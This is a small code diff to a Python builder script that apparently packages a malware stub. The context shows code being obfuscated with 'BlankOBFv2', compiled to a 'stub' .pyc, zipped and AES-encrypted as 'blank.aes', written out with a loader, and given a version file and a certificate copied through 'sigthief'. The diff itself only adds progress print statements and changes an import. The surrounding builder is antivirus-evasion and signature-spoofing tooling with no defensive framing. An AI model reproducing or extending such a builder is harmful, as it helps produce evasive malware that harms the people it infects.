@@ -11,7 +11,7 @@ import zipfile
 
 from urllib3 import PoolManager, disable_warnings
 disable_warnings()
-from BlankOBFv2 import BlankOBFv2
+from BlankOBFv2 import *
 from sigthief import outputCert
 
 SettingsFile = "config.json"
@@ -178,6 +178,7 @@ def main() -> None:
     obfuscator = BlankOBFv2(code, include_imports=False, recursion=1)
     OutCodeFile = obfuscator.obfuscate()
     junk(OutCodeFile)
+    print("dump code done!")
 
     compiledFile = "stub-o.pyc"
     zipFile = "blank.aes"
@@ -186,6 +187,7 @@ def main() -> None:
     with zipfile.ZipFile(zipFile, "w") as zip:
         zip.write(compiledFile)
     os.remove(compiledFile)
+    print("aes code done!")
 
     key = os.urandom(32)
     iv = os.urandom(12)
@@ -204,6 +206,7 @@ def main() -> None:
         file.write(loader)
 
     MakeVersionFileAndCert()
+    print("done all!")
 
 if __name__ == "__main__":
     main()
